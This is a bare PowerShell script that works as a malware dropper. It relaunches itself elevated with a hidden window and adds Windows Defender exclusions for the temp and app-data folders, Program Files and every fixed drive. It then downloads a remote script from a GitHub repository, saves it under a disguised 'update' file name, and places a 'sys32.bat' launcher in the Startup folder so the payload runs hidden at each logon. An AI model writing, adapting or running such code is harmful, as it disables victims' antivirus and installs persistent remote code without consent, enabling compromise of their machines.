$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    try {
        $scriptPath = $MyInvocation.MyCommand.Path
        if (Test-Path $scriptPath -PathType Leaf) {
            Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue | Out-Null
            exit
        }
    }
    catch {}
}

$maxRetries = 5
$baseDelay = 1000
$maxDelay = 30000

function Invoke-Retry {
    param($Action)
    $retryCount = 0
    while ($retryCount -lt $maxRetries) {
        try {
            & $Action
            return
        }
        catch {
            $retryCount++
            if ($retryCount -eq $maxRetries) { return }
            Start-Sleep -Milliseconds ([math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay) + (Get-Random -Minimum 0 -Maximum 100))
        }
    }
}

$installFolder = (Get-ChildItem -Path "C:\Program Files" -Directory -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName | Get-Random -ErrorAction SilentlyContinue) ?? "C:\Program Files"

Invoke-Retry {
    $exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
    $pathsToAdd = @($env:TEMP, $env:APPDATA, $env:LOCALAPPDATA, "C:\Program Files") + (Get-WmiObject Win32_LogicalDisk -ErrorAction SilentlyContinue | Where-Object {$_.DriveType -eq 3} | Select-Object -ExpandProperty DeviceID | ForEach-Object {"$_\"})
    $newPaths = $pathsToAdd | Where-Object {$exclusions -notcontains $_}
    if ($newPaths) { Add-MpPreference -ExclusionPath $newPaths -ErrorAction SilentlyContinue }
}

$pluginUrls = @(
    "https://github.com/skiddyskid111/resources/raw/main/plugins/plugin1.ps1"
)

$scriptPaths = @()
foreach ($url in $pluginUrls) {
    $randomString = -join ((65..90) + (97..122) | Get-Random -Count 3 | ForEach-Object {[char]$_})
    $fileName = "update$randomString.ps1"
    $path = Join-Path $installFolder $fileName

    Invoke-Retry {
        $exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
        if ($exclusions -notcontains $path) { Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue }
    }

    $webClient = $null
    try {
        Invoke-Retry {
            $webClient = New-Object System.Net.WebClient
            $webClient.DownloadFile($url, $path)
            if (Test-Path $path) { $scriptPaths += $path }
        }
    }
    catch {}
    finally {
        if ($webClient) { $webClient.Dispose() }
    }
}

$batContent = "@echo off`n"
foreach ($scriptPath in $scriptPaths) {
    $batContent += "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`" >nul 2>&1`n"
}

$startupFolder = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
$batFileName = "sys32.bat"
$batPath = Join-Path $startupFolder $batFileName

try {
    $batContent | Out-File -FilePath $batPath -Encoding ascii -ErrorAction SilentlyContinue
    Invoke-Retry {
        $exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
        if ($exclusions -notcontains $batPath) { Add-MpPreference -ExclusionPath $batPath -ErrorAction SilentlyContinue }
    }
}
catch {}
